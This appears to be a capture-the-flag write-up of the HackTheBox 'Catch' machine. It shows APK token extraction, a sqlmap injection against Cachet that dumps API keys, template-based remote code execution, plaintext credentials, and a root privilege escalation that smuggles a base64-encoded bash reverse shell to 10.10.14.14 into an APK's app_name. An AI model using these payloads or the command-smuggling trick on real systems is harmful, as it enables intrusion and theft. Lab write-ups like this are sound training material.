# Catch - HackTheBox - Writeup
Linux, 30 Base Points, Medium

![info.JPG](images/info.JPG)

## Machine

![‏‏Catch.JPG](images/Catch.JPG)
 
## TL;DR

To solve this machine, we begin by enumerating open services using ```namp``` – finding ports ```21```, ```22``` and ```80```.

***User***: Found ```status.catch.htb```, ```gitea_token``` and ```lets_chat_token``` on ```catchv1.0.apk```. Using ```lets_chat_token``` token we can use ```lets-chat``` API on port ```5000```, By using ```lets-chat``` API we get the credentials of ```john``` user, Using john credentials we connect to ```Cachet``` on port ```8000```, Using ```CVE-2021-39165``` we get SQLi and fetch the ```api_key``` of ```john``` user to ```Cachet```, Using the ```api_key``` we create an incident template and we get an RCE and found the password of ```will``` user on ```/var/www/html/Cachet/bootstrap/cache/config.php```.

***Root***: By running ```pspy``` we found the following script ```/opt/mdm/verify.sh``` that running by ```root``, The script contains ```app_check``` function that checks the application name and then runs another command that contains the application name, According to that, We decompiled the ```catchv1.0.apk``` inject reverse shell command on the application name (on ```strings.xml```).

![pwn.JPG](images/pwn.JPG)


## Catch Solution

### User

Let's start with ```nmap``` scanning:

```console
┌─[evyatar@parrot]─[/hackthebox/Catch]
└──╼ $ nmap -sV -sC -oA nmap/Catch 10.10.11.150
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-13 23:53 IDT
Nmap scan report for 10.10.11.150
Host is up (0.22s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Catch Global Systems
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: i_like_gitea=aaad4c3e514d2b92; Path=/; HttpOnly
|     Set-Cookie: _csrf=mKXUmOU2f6Q-UWJDjH1305giQ7Q6MTY1MjQ3NTI3Nzg3Njg2NzU2NA; Path=/; Expires=Sat, 14 May 2022 20:54:37 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Fri, 13 May 2022 20:54:37 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title> Catch Repositories </title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiQ2F0Y2ggUmVwb3NpdG9yaWVzIiwic2hvcnRfbmFtZSI6IkNhdGNoIFJlcG9zaXRvcmllcyIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jYXRjaC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNhdGNoLmh0Yjoz
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Set-Cookie: i_like_gitea=4a96ef4ce1532512; Path=/; HttpOnly
|     Set-Cookie: _csrf=hxcw-oXY5mprwSOaqZUOk6n4Xp86MTY1MjQ3NTI4NDA1MjM1MDQxNA; Path=/; Expires=Sat, 14 May 2022 20:54:44 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Fri, 13 May 2022 20:54:44 GMT
|_    Content-Length: 0
8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Catch Global Systems
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.80%I=7%D=5/13%Time=627EC554%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,1000,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\
SF:x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20i_like_gitea=aaad4c3e5
SF:14d2b92;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=mKXUmOU2f6Q-UWJ
SF:DjH1305giQ7Q6MTY1MjQ3NTI3Nzg3Njg2NzU2NA;\x20Path=/;\x20Expires=Sat,\x20
SF:14\x20May\x202022\x2020:54:37\x20GMT;\x20HttpOnly;\x20SameSite=Lax\r\nS
SF:et-Cookie:\x20macaron_flash=;\x20Path=/;\x20Max-Age=0;\x20HttpOnly\r\nX
SF:-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Fri,\x2013\x20May\x202022\x20
SF:20:54:37\x20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20c
SF:lass=\"theme-\">\n<head\x20data-suburl=\"\">\n\t<meta\x20charset=\"utf-
SF:8\">\n\t<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20
SF:initial-scale=1\">\n\t<meta\x20http-equiv=\"x-ua-compatible\"\x20conten
SF:t=\"ie=edge\">\n\t<title>\x20Catch\x20Repositories\x20</title>\n\t<link
SF:\x20rel=\"manifest\"\x20href=\"data:application/json;base64,eyJuYW1lIjo
SF:iQ2F0Y2ggUmVwb3NpdG9yaWVzIiwic2hvcnRfbmFtZSI6IkNhdGNoIFJlcG9zaXRvcmllcy
SF:IsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jYXRjaC5odGI6MzAwMC8iLCJpY29ucyI6W
SF:3sic3JjIjoiaHR0cDovL2dpdGVhLmNhdGNoLmh0Yjoz")%r(Help,67,"HTTP/1\.1\x204
SF:00\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r
SF:\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,17F
SF:,"HTTP/1\.0\x20405\x20Method\x20Not\x20Allowed\r\nSet-Cookie:\x20i_like
SF:_gitea=4a96ef4ce1532512;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf
SF:=hxcw-oXY5mprwSOaqZUOk6n4Xp86MTY1MjQ3NTI4NDA1MjM1MDQxNA;\x20Path=/;\x20
SF:Expires=Sat,\x2014\x20May\x202022\x2020:54:44\x20GMT;\x20HttpOnly;\x20S
SF:ameSite=Lax\r\nSet-Cookie:\x20macaron_flash=;\x20Path=/;\x20Max-Age=0;\
SF:x20HttpOnly\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Fri,\x2013\x2
SF:0May\x202022\x2020:54:44\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTS
SF:PRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
SF:Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

And by scanning all ports we found also port ```5000```.

By observing port 80 we get the following web page:

![port80.JPG](images/port80.JPG)

Clicking on [Download Now](http://10.10.11.150/catchv1.0.apk) we get the [catchv1.0.apk](./catchv1.0.apk) file.

By decompiling the ```apk``` file using [jadx](https://github.com/skylot/jadx) we can see the following code on ```MainActivity```:
```java

/* loaded from: classes.dex */
public class MainActivity extends AppCompatActivity {
    private WebView mywebView;

    /* JADX INFO: Access modifiers changed from: protected */
    @Override // androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(R.layout.activity_main);
        WebView webView = (WebView) findViewById(R.id.webview);
        this.mywebView = webView;
        webView.setWebViewClient(new WebViewClient());
        this.mywebView.loadUrl("https://status.catch.htb/");
        this.mywebView.getSettings().setJavaScriptEnabled(true);
    }

    /* loaded from: classes.dex */
    public class mywebClient extends WebViewClient {
        public mywebClient() {
        }

        @Override // android.webkit.WebViewClient
        public void onPageStarted(WebView webView, String str, Bitmap bitmap) {
            super.onPageStarted(webView, str, bitmap);
        }

        @Override // android.webkit.WebViewClient
        public boolean shouldOverrideUrlLoading(WebView webView, String str) {
            webView.loadUrl(str);
            return true;
        }
    }

    @Override // androidx.activity.ComponentActivity, android.app.Activity
    public void onBackPressed() {
        if (this.mywebView.canGoBack()) {
            this.mywebView.goBack();
        } else {
            super.onBackPressed();
        }
    }
}
```

Le'ts add ```catch.htb``` and ```status.catch.htb``` to ```/etc/hosts```.

On the file ```strings.xml``` (locate on ```Resources/resources.asrc/res/values```) we found the following tokens:
```xml
...
<string name="gitea_token">b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0</string>
<string name="lets_chat_token">NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==</string>
...
```

Let's observe ports ```3000```, ```8000``` and ```5000```.

[http://catch.htb:3000](http://catch.htb:3000):

![port3000.JPG](images/port3000.JPG)

[http://catch.htb:5000](http://catch.htb:5000):

![port5000.JPG](images/port5000.JPG)

[http://catch.htb:8000](http://catch.htb:8000):

![port8000.JPG](images/port8000.JPG)

Port ```8000``` based on [Cachet](https://cachethq.io/).

Cachet is a Statuspage system developed based on the Laravel framework. Statuspage is a type of system that has slowly emerged after the popularity of cloud platforms. Its function is to show the outside world whether its various services are running normally. Many large foreign Internet platforms have Statuspage, the most famous ones are Github , Twitter , Facebook , Amazon AWS , etc [Reference](https://www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.html).

Let's observe again on port ```8000```, We can see the following API of ```lets-chat```:

[https://github.com/sdelements/lets-chat/wiki/API](https://github.com/sdelements/lets-chat/wiki/API)

With ```GET /rooms``` API we can retrieve all rooms in a JSON list.

We can use the ```lets_chat_token``` from the apk file for the authorization.

According to [https://github.com/sdelements/lets-chat/issues/693](https://github.com/sdelements/lets-chat/issues/693) we need to use ```Bearer``` authorization.

Let's send the following HTTP request:
```HTTP
GET /rooms HTTP/1.1
Host: catch.htb:5000
Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ== 
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cache-Control: max-age=0

```

And we get the response:
```json
HTTP/1.1 200 OK
X-Frame-Options: SAMEORIGIN
X-Download-Options: noopen
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Content-Security-Policy: 
X-UA-Compatible: IE=Edge,chrome=1
Content-Type: application/json; charset=utf-8
ETag: W/"35c-aAImKzSV1mWHmtGLu5/YkMt+2hk"
Set-Cookie: connect.sid=s%3AM5jUO0h_umdtT09ZZNvhZpGpwCQE-91Y.cIlv23%2BoFSYh%2FOsPBk1SYbeLxyonDDaw93Jn2fih1j4; Path=/; HttpOnly
Vary: Accept-Encoding
Date: Sun, 22 May 2022 18:58:37 GMT
Connection: keep-alive
Content-Length: 860

[
   {
      "id":"61b86b28d984e2451036eb17",
      "slug":"status",
      "name":"Status",
      "description":"Cachet Updates and Maintenance",
      "lastActive":"2021-12-14T10:34:20.749Z",
      "created":"2021-12-14T10:00:08.384Z",
      "owner":"61b86aead984e2451036eb16",
      "private":false,
      "hasPassword":false,
      "participants":[
         
      ]
   },
   {
      "id":"61b8708efe190b466d476bfb",
      "slug":"android_dev",
      "name":"Android Development",
      "description":"Android App Updates, Issues & More",
      "lastActive":"2021-12-14T10:24:21.145Z",
      "created":"2021-12-14T10:23:10.474Z",
      "owner":"61b86aead984e2451036eb16",
      "private":false,
      "hasPassword":false,
      "participants":[
         
      ]
   },
   {
      "id":"61b86b3fd984e2451036eb18",
      "slug":"employees",
      "name":"Employees",
      "description":"New Joinees, Org updates",
      "lastActive":"2021-12-14T10:18:04.710Z",
      "created":"2021-12-14T10:00:31.043Z",
      "owner":"61b86aead984e2451036eb16",
      "private":false,
      "hasPassword":false,
      "participants":[
         
      ]
   }
]
```

Now we can use the API [GET /rooms/:room/messages](https://github.com/sdelements/lets-chat/wiki/API%3A-Messages#get-roomsroommessages) to get messages by room id ```61b86b28d984e2451036eb17```:
```http
GET /rooms/61b86b28d984e2451036eb17/messages HTTP/1.1
Host: catch.htb:5000
Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ== 
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cache-Control: max-age=0

```

Response:
```json
HTTP/1.1 200 OK
X-Frame-Options: SAMEORIGIN
X-Download-Options: noopen
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Content-Security-Policy: 
X-UA-Compatible: IE=Edge,chrome=1
Content-Type: application/json; charset=utf-8
ETag: W/"7de-G7OZAcMzWuoZBQCFNVQ+lgsTGTA"
Set-Cookie: connect.sid=s%3AELS5fKMDDus8Kfs-3nbhQjBc7jmEtbPj.Vn8ilzJua9C4xE5PBgk60OoR%2F%2BDmpsxdcw6gwtoi6Fo; Path=/; HttpOnly
Vary: Accept-Encoding
Date: Sun, 22 May 2022 19:01:20 GMT
Connection: keep-alive
Content-Length: 2014

[
   {
      "id":"61b8732cfe10b466d476c02",
      "text":"ah sure!",
      "posted":"2021-12-14T10:34:20.749Z",
      "owner":"61b86dbdfe190b466d476bf0",
      "room":"61b86b28d984e2451036eb17"
   },
   {
      "id":"61b8731ffe190b466d476c01",
      "text":"You should actually include this task to your list as well as a part of quarterly audit",
      "posted":"2021-12-14T10:34:07.449Z",
      "owner":"61b86aead984e2451036eb16",
      "room":"61b86b28d984e2451036eb17"
   },
   {
      "id":"61b872b9fe190b466d476c00",
      "text":"Also make sure we've our systems, applications and databases up-to-date.",
      "posted":"2021-12-14T10:32:25.514Z",
      "owner":"61b86dbdfe190b466d476bf0",
      "room":"61b86b28d984e2451036eb17"
   },
   {
      "id":"61b87282fe190b466d476bff",
      "text":"Excellent! ",
      "posted":"2021-12-14T10:31:30.403Z",
      "owner":"61b86aead984e2451036eb16",
      "room":"61b86b28d984e2451036eb17"
   },
   {
      "id":"61b87277fe190b466d476bfe",
      "text":"Why not. We've this in our todo list for next quarter",
      "posted":"2021-12-14T10:31:19.094Z",
      "owner":"61b86dbdfe190b466d476bf0",
      "room":"61b86b28d984e2451036eb17"
   },
   {
      "id":"61b87241fe190b466d476bfd",
      "text":"@john is it possible to add SSL to our status domain to make sure everything is secure ? ",
      "posted":"2021-12-14T10:30:25.108Z",
      "owner":"61b86aead984e2451036eb16",
      "room":"61b86b28d984e2451036eb17"
   },
   {
      "id":"61b8702dfe190b466d476bfa",
      "text":"Here are the credentials `john :  E}V!mywu_69T4C}W`",
      "posted":"2021-12-14T10:21:33.859Z",
      "owner":"61b86f15fe190b466d476bf5",
      "room":"61b86b28d984e2451036eb17"
   },
   {
      "id":"61b87010fe190b466d476bf9",
      "text":"Sure one sec.",
      "posted":"2021-12-14T10:21:04.635Z",
      "owner":"61b86f15fe190b466d476bf5",
      "room":"61b86b28d984e2451036eb17"
   },
   {
      "id":"61b86fb1fe190b466d476bf8",
      "text":"Can you create an account for me ? ",
      "posted":"2021-12-14T10:19:29.677Z",
      "owner":"61b86dbdfe190b466d476bf0",
      "room":"61b86b28d984e2451036eb17"
   },
   {
      "id":"61b86f4dfe190b466d476bf6",
      "text":"Hey Team! I'll be handling the `status.catch.htb` from now on. Lemme know if you need anything from me. ",
      "posted":"2021-12-14T10:17:49.761Z",
      "owner":"61b86f15fe190b466d476bf5",
      "room":"61b86b28d984e2451036eb17"
   }
]
```

And we can see the credentials ```john :  E}V!mywu_69T4C}W```.

Let's use ```john``` credentials on port ```8000``` [http://catch.htb:8000/dashboard](http://catch.htb:8000/dashboard):

![johnlogin.JPG](images/johnlogin.JPG)

And we get the following dashboard:

![dashboard.JPG](images/dashboard.JPG)

According to the following [https://www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.html](https://www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.html), We need to create a [incident template](http://catch.htb:8000/dashboard/templates/create) and then to create an incident to trigger the incident template.

Let's create an incident template with RCE:

![template.JPG](images/template.JPG)

To trigger the template we need to create an incident using the following HTTP request:
```http
POST /api/v1/incidents HTTP/1.1
Host:status.catch.htb:8000
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
X-Cachet-Token: <JOHN API KEY>
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

visible=0&status=1&name=d&template=test
```

To create an incident we need the ```<JOHN API KEY>``` of ```john``` user, We can get it from the database using SQLi from ```Users``` table on ```Cachet``` database:
```console
┌─[evyatar@parrot]─[/hackthebox/Catch]
└──╼ $ sqlmap -u "http://catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+" --dump -D cachet -T users -t 100

       __H__
 ___ ___["]_____ ___ ___  {1.6#stable}
|_ -| . [(]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:02:08 /2022-05-22/

[23:02:08] [INFO] setting file for logging HTTP traffic
custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] 

[23:02:29] [INFO] resuming back-end DBMS 'mysql' 
[23:02:29] [INFO] testing connection to the target URL
[23:02:29] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+'a'=? and 1=1) AND (SELECT 1685 FROM (SELECT(SLEEP(5)))EDDH)+--+
---
[23:02:29] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[23:02:29] [INFO] fetching columns for table 'users' in database 'cachet'
[23:02:29] [INFO] resumed: 12
[23:02:29] [INFO] resumed: id
[23:02:29] [INFO] resumed: username
[23:02:29] [INFO] resumed: password
[23:02:29] [INFO] resumed: remember_token
[23:02:29] [INFO] resumed: google_2fa_secret
[23:02:29] [INFO] resumed: email
[23:02:29] [INFO] resumed: api_key
[23:02:29] [INFO] resumed: active
[23:02:29] [INFO] resumed: level
[23:02:29] [INFO] resumed: welcomed
[23:02:29] [INFO] resumed: created_at
[23:02:29] [INFO] resumed: updated_at
[23:02:29] [INFO] fetching entries for table 'users' in database 'cachet'
[23:02:29] [INFO] fetching number of entries for table 'users' in database 'cachet'
[23:02:29] [INFO] resumed: 2
[23:02:29] [INFO] resumed: 1
[23:02:29] [INFO] resumed: 1
[23:02:29] [INFO] resumed: rMSN8kJN9TPADl2cWv8N
[23:02:29] [INFO] resumed: 2022-03-03 02:51:26
[23:02:29] [INFO] resumed: admin@catch.htb
[23:02:29] [INFO] resumed:  
[23:02:29] [INFO] resumed: 1
[23:02:29] [INFO] resumed: $2y$10$quY5ttamPWVo54lbyLSWEu00A/tkMlqoFaEKwJSWPVGHpVK2Wj7Om
[23:02:29] [INFO] resumed: 5t3PCyAurH7oKann9dhMfL7t0ZTN7bz4yiASDB8EAfkAOcN60yx0YTfBBlPj
[23:02:29] [INFO] resumed: 2022-03-03 02:51:35
[23:02:29] [INFO] resumed: admin
[23:02:29] [INFO] resumed: 1
[23:02:29] [INFO] resumed: 2
[23:02:29] [INFO] resumed: 1
[23:02:29] [INFO] resumed: 7GVCqTY5abrox48Nct8j
[23:02:29] [INFO] resumed: 2022-03-03 02:51:57
[23:02:29] [INFO] resumed: john@catch.htb
[23:02:29] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)
[23:02:37] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] 
[23:02:53] [INFO] adjusting time delay to 2 seconds due to good response times
....
```

So we have the ```API key``` of ```john``` ```7GVCqTY5abrox48Nct8j```.

Let's send the following HTTP request to get RCE:
```http
POST /api/v1/incidents HTTP/1.1
Host:status.catch.htb:8000
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
X-Cachet-Token: 7GVCqTY5abrox48Nct8j
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

visible=0&status=1&name=test1&template=d
```

And we get the response:
```http
HTTP/1.1 200 OK
Date: Sun, 22 May 2022 21:07:01 GMT
Server: Apache/2.4.29 (Ubuntu)
Cache-Control: no-cache, private
Content-Length: 604
Connection: close
Content-Type: application/json

{
   "data":{
      "stickied":false,
      "notifications":false,
      "user_id":2,
      "name":"test12 | g",
      "status":1,
      "visible":0,
      "message":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\nuid=33(www-data) gid=33(www-data) groups=33(www-data)",
      "occurred_at":"2022-05-22 21:07:01",
      "updated_at":"2022-05-22 21:07:01",
      "created_at":"2022-05-22 21:07:01",
      "id":17,
      "is_resolved":false,
      "updates":[
         
      ],
      "human_status":"Investigating",
      "latest_update_id":null,
      "latest_status":1,
      "latest_human_status":"Investigating",
      "latest_icon":"icon ion-flag oranges",
      "permalink":"http:\/\/status.catch.htb:8000\/incidents\/17",
      "duration":0,
      "meta":[
         
      ]
   }
}
```

As we can see, We get the response of the ```id``` command on ```message``` field.

By enumerating the machine we found a file ```cat /var/www/html/Cachet/bootstrap/cache/config.php``` which contains credentials of ```will``` user.

Let's set the template to the following:

![configphp.JPG](images/configphp.JPG)

Send the HTTP request again and we get the content of ```config.php```:
```php
...
'mysql' => 
array (
  'driver' => 'mysql',
  'host' => 'localhost',
  'unix_socket' => NULL,
  'port' => NULL,
  'database' => 'cachet',
  'username' => 'will',
  'password' => 's2#4Fg0_%3!',
  'charset' => 'utf8mb4',
  'collation' => 'utf8mb4_unicode_ci',
  'prefix' => NULL,
  'strict' => false,
  'engine' => NULL,
),
...
```

Let's use ```will``` password ```s2#4Fg0_%3!``` to SSH login:
```console
┌─[evyatar@parrot]─[/hackthebox/Catch]
└──╼ $ ssh will@catch.htb
will@catch.htb's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-104-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 22 May 2022 09:05:50 PM UTC

  System load:                      0.12
  Usage of /:                       71.6% of 16.61GB
  Memory usage:                     84%
  Swap usage:                       29%
  Processes:                        437
  Users logged in:                  0
  IPv4 address for br-535b7cf3a728: 172.18.0.1
  IPv4 address for br-fe1b5695b604: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.150
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:56bf


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

will@catch:~$ cat user.txt
c21ba57243d3b339b1b580624e1dc28b

```

And we get the user flag ```c21ba57243d3b339b1b580624e1dc28b```.

### Root

By running [pspy64](https://github.com/DominicBreuker/pspy) we can see the following process running by ```root```:
```console
...
2022/05/26 18:59:02 CMD: UID=0    PID=46466  | /bin/bash /opt/mdm/verify.sh
...
```

Let's observe the script ```/opt/mdm/verify.sh```:
```batch
#!/bin/bash

###################
# Signature Check #
###################

sig_check() {
	jarsigner -verify "$1/$2" 2>/dev/null >/dev/null
	if [[ $? -eq 0 ]]; then
		echo '[+] Signature Check Passed'
	else
		echo '[!] Signature Check Failed. Invalid Certificate.'
		cleanup
		exit
	fi
}

#######################
# Compatibility Check #
#######################

comp_check() {
	apktool d -s "$1/$2" -o $3 2>/dev/null >/dev/null
	COMPILE_SDK_VER=$(grep -oPm1 "(?<=compileSdkVersion=\")[^\"]+" "$PROCESS_BIN/AndroidManifest.xml")
	if [ -z "$COMPILE_SDK_VER" ]; then
		echo '[!] Failed to find target SDK version.'
		cleanup
		exit
	else
		if [ $COMPILE_SDK_VER -lt 18 ]; then
			echo "[!] APK Doesn't meet the requirements"
			cleanup
			exit
		fi
	fi
}

####################
# Basic App Checks #
####################

app_check() {
	APP_NAME=$(grep -oPm1 "(?<=<string name=\"app_name\">)[^<]+" "$1/res/values/strings.xml")
	echo $APP_NAME
	if [[ $APP_NAME == *"Catch"* ]]; then
		echo -n $APP_NAME|xargs -I {} sh -c 'mkdir {}'
		mv "$3/$APK_NAME" "$2/$APP_NAME/$4"
	else
		echo "[!] App doesn't belong to Catch Global"
		cleanup
		exit
	fi
}


###########
# Cleanup #
###########

cleanup() {
	rm -rf $PROCESS_BIN;rm -rf "$DROPBOX/*" "$IN_FOLDER/*";rm -rf $(ls -A /opt/mdm | grep -v apk_bin | grep -v verify.sh)
}


###################
# MDM CheckerV1.0 #
###################

DROPBOX=/opt/mdm/apk_bin
IN_FOLDER=/root/mdm/apk_bin
OUT_FOLDER=/root/mdm/certified_apps
PROCESS_BIN=/root/mdm/process_bin

for IN_APK_NAME in $DROPBOX/*.apk;do
	OUT_APK_NAME="$(echo ${IN_APK_NAME##*/} | cut -d '.' -f1)_verified.apk"
	APK_NAME="$(openssl rand -hex 12).apk"
	if [[ -L "$IN_APK_NAME" ]]; then
		exit
	else
		mv "$IN_APK_NAME" "$IN_FOLDER/$APK_NAME"
	fi
	sig_check $IN_FOLDER $APK_NAME
	comp_check $IN_FOLDER $APK_NAME $PROCESS_BIN
	app_check $PROCESS_BIN $OUT_FOLDER $IN_FOLDER $OUT_APK_NAME
done
cleanup
```

Let's observe ```app_check``` function:
```batch
...
####################
# Basic App Checks #
####################

app_check() {
	APP_NAME=$(grep -oPm1 "(?<=<string name=\"app_name\">)[^<]+" "$1/res/values/strings.xml")
	echo $APP_NAME
	if [[ $APP_NAME == *"Catch"* ]]; then
		echo -n $APP_NAME|xargs -I {} sh -c 'mkdir {}'
		mv "$3/$APK_NAME" "$2/$APP_NAME/$4"
	else
		echo "[!] App doesn't belong to Catch Global"
		cleanup
		exit
	fi
}
...
```

As we can see, the function reads the application name from ```res/values/strings.xml``` file.

We can use command injection to inject a command that will run using ```echo -n $APP_NAME|xargs -I {} sh -c 'mkdir {}'```.

First, we need to decompile the ```apk``` file using [apktool](https://ibotpeaches.github.io/Apktool/).

```console
┌─[evyatar@parrot]─[/hackthebox/Catch]
└──╼ $ java -jar apktool_2.6.1.jar -s catchv1.0.apk -o catch
I: Using Apktool 2.5.0-dirty on catchv1.0.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /home/evyatar/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Copying raw classes.dex file...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
┌─[evyatar@parrot]─[/hackthebox/Catch]
└──╼ $ ls
apktool_2.6.1.jar  catch  catchv1.0.apk
``` 

Now, Let's edit the file ```./catch/res/values/strings.xml``` file from:
```xml
...
<string name="app_name">Catch</string>
...
```

To:
```xml
<string name="app_name">Catch; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNC80MjQyIDA+JjEK | base64 -d | bash -i</string>
```

Where ```YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNC80MjQyIDA+JjEK``` is:
```console
┌─[evyatar@parrot]─[/hackthebox/Catch]
└──╼ $ echo "bash -i >& /dev/tcp/10.10.14.14/4242 0>&1" | base64 -w0
```

Now, Let's compile it again:
```console
┌─[evyatar@parrot]─[/hackthebox/Catch]
└──╼ $ java -jar apktool_2.6.1.jar b catch
I: Using Apktool 2.6.1
I: Checking whether resources has changed...
I: Building resources...
I: Building apk file...
I: Copying unknown files/dir...
I: Built apk...
```

And we can get the file from ```catch/dist``` directory:
```console
┌─[evyatar@parrot]─[/hackthebox/Catch]
└──╼ $ ls catch/dist/
